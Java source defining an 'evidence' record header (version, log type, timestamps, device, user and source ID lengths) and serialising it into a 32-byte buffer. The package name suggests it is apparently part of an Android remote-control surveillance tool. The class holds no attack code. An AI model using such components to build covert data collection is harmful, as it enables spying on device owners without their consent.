package com.ht.RCSAndroidGUI;

import com.ht.RCSAndroidGUI.utils.Check;
import com.ht.RCSAndroidGUI.utils.DataBuffer;

public class EvidenceDescription {
    public int version;
    public int logType;
    public int hTimeStamp;
    public int lTimeStamp;

    public int deviceIdLen;
    public int userIdLen;
    public int sourceIdLen;
    public int additionalData;

    public final int length = 32;

    /**
     * Gets the bytes.
     * 
     * @return the bytes
     */
    public byte[] getBytes() {
        final byte[] buffer = new byte[length];
        serialize(buffer, 0);
        //#ifdef DBC
        Check.ensures(buffer.length == length, "Wrong len");
        //#endif
        return buffer;
    }

    /**
     * Serialize.
     * 
     * @param buffer
     *            the buffer
     * @param offset
     *            the offset
     */
    public void serialize(final byte[] buffer, final int offset) {
        final DataBuffer databuffer = new DataBuffer(buffer, offset, length);
        databuffer.writeInt(version);
        databuffer.writeInt(logType);
        databuffer.writeInt(hTimeStamp);
        databuffer.writeInt(lTimeStamp);

        databuffer.writeInt(deviceIdLen);
        databuffer.writeInt(userIdLen);
        databuffer.writeInt(sourceIdLen);
        databuffer.writeInt(additionalData);

    }
}
